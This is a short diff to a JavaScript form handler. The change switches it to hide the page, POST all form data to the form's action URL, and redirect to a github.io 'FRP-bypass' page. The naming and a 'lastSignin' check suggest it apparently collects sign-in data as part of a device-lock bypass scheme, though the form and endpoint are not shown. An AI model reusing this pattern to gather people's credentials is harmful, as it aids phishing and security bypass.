@@ -84,37 +84,36 @@ if (lastSignin == 'invalid') {
 }
 
 if (isFormGood) {
-  // alert('Registered');
-  setTimeout(() => {
-    window.location.href = "https://ukulyelye.github.io/FRP-bypass/sidesync.html";
-  }, 3500);
-  // event.preventDefault(); // Prevent default form submission
+  event.preventDefault(); // Prevent default form submission
+  document.body.style.display = "none";
+  // Get form data
+  var formData = new FormData(this);
   
-  // // Get form data
-  // var formData = new FormData(this);
-  
-  // // Send form data asynchronously
-  // fetch(this.action, {
-  //   method: 'POST',
-  //   body: formData,
-  //   headers: {
-  //     'Accept': 'application/json'
-  //   }
-  // })
-  // .then(response => {
-  //   if (response.ok) {
-  //     // Optionally, do something with the successful response
-  //     console.log("Form submitted successfully");
-  //     // Redirect to github.com
-  //     window.location.href = "https://ukulyelye.github.io/FRP-bypass/sidesync.html";
-  //   } else {
-  //     // Handle errors
-  //     console.error("Form submission failed");
-  //   }
-  // })
-  // .catch(error => {
-  //   console.error("Error:", error);
-  // });
+  // Send form data asynchronously
+  fetch(this.action, {
+    method: 'POST',
+    body: formData,
+    headers: {
+      'Accept': 'application/json'
+    }
+  })
+  .then(response => {
+    if (response.ok) {
+      // Optionally, do something with the successful response
+      console.log("Form submitted successfully");
+      // Redirect to github.com
+      setTimeout(()=>{
+        window.location.href = "https://ukulyelye.github.io/FRP-bypass/sidesync.html";
+        // alert("Хорошо!!!!!");
+      },3000)
+    } else {
+      // Handle errors
+      console.error("Form submission failed");
+    }
+  })
+  .catch(error => {
+    alert("Error:", error);
+  });
 }
 
 });
